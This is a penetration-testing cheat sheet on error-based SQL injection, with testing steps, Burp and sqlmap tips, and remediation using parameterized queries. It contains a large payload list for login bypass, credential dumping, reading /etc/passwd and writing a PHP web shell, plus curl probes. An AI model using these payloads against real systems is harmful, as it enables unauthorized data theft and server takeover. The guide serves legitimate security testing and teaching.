# SQL Injection Classic (Error-based)

## Overview
Classic SQL injection occurs when user-supplied input is concatenated directly into SQL queries without proper sanitization or parameterization. Error-based SQLi is the most visible form: the database returns verbose error messages in the HTTP response that reveal the query structure, database version, schema names, and table data — making exploitation straightforward even without blind techniques. It is one of the most well-known and impactful vulnerabilities in web security, capable of leading to full database compromise.

## How It Works
- The application constructs an SQL query by concatenating user input: `SELECT * FROM users WHERE id = ` + user_input
- An attacker injects SQL syntax that alters the query structure: `1 OR 1=1--`
- The database executes the modified query and may return more rows than intended.
- With error-based techniques, the attacker injects functions that force the database to include data (like table names or column values) inside an error message returned to the HTTP response.
- MySQL `extractvalue()`, `updatexml()`, MSSQL `convert()`, and Oracle `ctxsys.drithsx.sn()` are commonly abused for this purpose.
- The attacker reads the database schema, extracts credentials, and potentially executes OS commands.

## Impact
- Full read access to the entire database: credentials, PII, business data.
- Authentication bypass (`' OR '1'='1`).
- Data modification or deletion (UPDATE/DELETE injection).
- Privilege escalation via reading admin credentials from the database.
- Remote code execution via `xp_cmdshell` (MSSQL), UDF (MySQL), or `EXECUTE IMMEDIATE` (Oracle).
- File read/write on the database server filesystem.

## Where to Look
- URL query parameters: `?id=1`, `?category=shoes`, `?sort=name`
- POST body parameters in login forms, search forms, and filters.
- HTTP headers: `User-Agent`, `X-Forwarded-For`, `Referer`, `Cookie` values used in queries.
- REST API path parameters: `/api/user/1`, `/api/product/shoes`
- JSON body parameters in API requests.
- Second-order injection: data stored in the database and later used unsafely in a query.
- XML and GraphQL inputs that feed into database queries.

## Testing Steps
1. Identify all input points that interact with the database (parameters, headers, path segments).
2. Inject a single quote `'` and observe the response for SQL error messages.
3. Inject `''` (two single quotes) — if the response is normal again, SQL injection is likely.
4. Test `1 AND 1=1` (true condition, same result) vs. `1 AND 1=2` (false condition, different/empty result).
5. Try comment sequences: `--`, `#`, `/**/` to terminate the rest of the query.
6. Attempt UNION injection to determine the number of columns: `1 UNION SELECT NULL--` (increase NULLs until no error).
7. Use error-based extraction: `1 AND extractvalue(1,concat(0x7e,(SELECT version())))--`
8. Enumerate database: `(SELECT database())`, `(SELECT table_name FROM information_schema.tables LIMIT 1)`.
9. Extract data: `(SELECT column FROM table LIMIT 1)`.
10. Test authentication bypass on login forms: `admin'--`, `' OR '1'='1'--`.

## Payloads / Techniques

```sql
-- Basic detection payloads
'
''
`
')
'))
" 
1'
1"
1 AND 1=1--
1 AND 1=2--
1 OR 1=1--
' OR '1'='1
' OR '1'='1'--
' OR '1'='1'/*

-- Authentication bypass
admin'--
admin' #
admin'/*
' OR 1=1--
' OR 'x'='x
') OR ('1'='1
' OR 1=1 LIMIT 1--

-- Error-based MySQL (extractvalue)
' AND extractvalue(1,concat(0x7e,(SELECT version())))--
' AND extractvalue(1,concat(0x7e,(SELECT database())))--
' AND extractvalue(1,concat(0x7e,(SELECT table_name FROM information_schema.tables WHERE table_schema=database() LIMIT 0,1)))--
' AND extractvalue(1,concat(0x7e,(SELECT column_name FROM information_schema.columns WHERE table_name='users' LIMIT 0,1)))--
' AND extractvalue(1,concat(0x7e,(SELECT concat(username,0x3a,password) FROM users LIMIT 0,1)))--

-- Error-based MySQL (updatexml)
' AND updatexml(1,concat(0x7e,(SELECT version())),1)--
' AND updatexml(1,concat(0x7e,(SELECT group_concat(table_name) FROM information_schema.tables WHERE table_schema=database())),1)--

-- Error-based MSSQL
' AND 1=CONVERT(int,(SELECT TOP 1 table_name FROM information_schema.tables))--
'; SELECT 1/0--
' AND 1=CAST((SELECT version()) AS INT)--

-- UNION-based (determine column count)
' UNION SELECT NULL--
' UNION SELECT NULL,NULL--
' UNION SELECT NULL,NULL,NULL--

-- UNION-based data extraction (3 columns, string in col 2)
' UNION SELECT NULL,version(),NULL--
' UNION SELECT NULL,database(),NULL--
' UNION SELECT NULL,group_concat(table_name),NULL FROM information_schema.tables WHERE table_schema=database()--
' UNION SELECT NULL,group_concat(column_name),NULL FROM information_schema.columns WHERE table_name='users'--
' UNION SELECT NULL,group_concat(username,0x3a,password),NULL FROM users--

-- File read (MySQL, requires FILE privilege)
' UNION SELECT NULL,LOAD_FILE('/etc/passwd'),NULL--
' UNION SELECT NULL,LOAD_FILE('/var/www/html/config.php'),NULL--

-- File write (MySQL)
' UNION SELECT NULL,"<?php system($_GET['cmd']); ?>",NULL INTO OUTFILE '/var/www/html/shell.php'--
```

```bash
# Manual testing with curl
# Test for error
curl -si "https://target.com/item?id=1'"

# Test Boolean
curl -si "https://target.com/item?id=1 AND 1=1--"
curl -si "https://target.com/item?id=1 AND 1=2--"

# Error-based extraction
curl -si "https://target.com/item?id=1' AND extractvalue(1,concat(0x7e,(SELECT version())))--"
```

## Burp Suite Tips
- **Scanner**: Run Burp's active scanner on all parameters — it detects SQL injection with error signatures.
- **Intruder**: Use the SQLi payload list from PortSwigger (built into Intruder) to fuzz all parameters simultaneously.
- **Send to Repeater**: When you find a potential injection point, send to Repeater for manual exploitation.
- **Search Response**: Use `Ctrl+F` in Repeater/Proxy to search for SQL error strings: `mysql_fetch`, `ORA-`, `ODBC SQL`, `syntax error`, `Microsoft SQL Server`.
- **Scan from Clipboard**: Right-click any suspicious parameter and choose "Scan selected insertion point" for a targeted scan.
- **SQLMap Integration**: Send the request to file via "Save item" then run sqlmap with `-r request.txt`.

## Tools
- **sqlmap** — automated SQL injection detection and exploitation: `sqlmap -u "https://target.com/item?id=1" --dbs`
- **Burp Suite** — manual and automated SQLi discovery.
- **Havij** — GUI-based SQLi exploitation tool.
- **BBQSQL** — blind SQLi exploitation framework.
- **jSQL Injection** — Java-based GUI SQLi exploitation.
- **SQLiDumper** — automated dumping tool.

## Remediation
- Use parameterized queries (prepared statements) exclusively — never concatenate user input into SQL.
  - PHP PDO: `$stmt = $pdo->prepare("SELECT * FROM users WHERE id = ?"); $stmt->execute([$id]);`
  - Python: `cursor.execute("SELECT * FROM users WHERE id = %s", (user_id,))`
  - Java: `PreparedStatement ps = conn.prepareStatement("SELECT * FROM users WHERE id = ?"); ps.setInt(1, id);`
- Use ORM frameworks (Hibernate, SQLAlchemy, ActiveRecord) that abstract raw SQL.
- Apply input validation: whitelist expected formats (integers, alphanumeric) and reject others.
- Disable verbose database error messages in production — log errors server-side, show generic messages to users.
- Apply least privilege: database users should not have DROP, CREATE, or FILE privileges.
- Use Web Application Firewalls (WAF) as a defense-in-depth layer, not a primary defense.
- Conduct regular code audits for string concatenation in SQL contexts.

## References
https://owasp.org/www-community/attacks/SQL_Injection
https://portswigger.net/web-security/sql-injection
https://portswigger.net/web-security/sql-injection/union-attacks
https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html
https://github.com/sqlmapproject/sqlmap
https://cwe.mitre.org/data/definitions/89.html
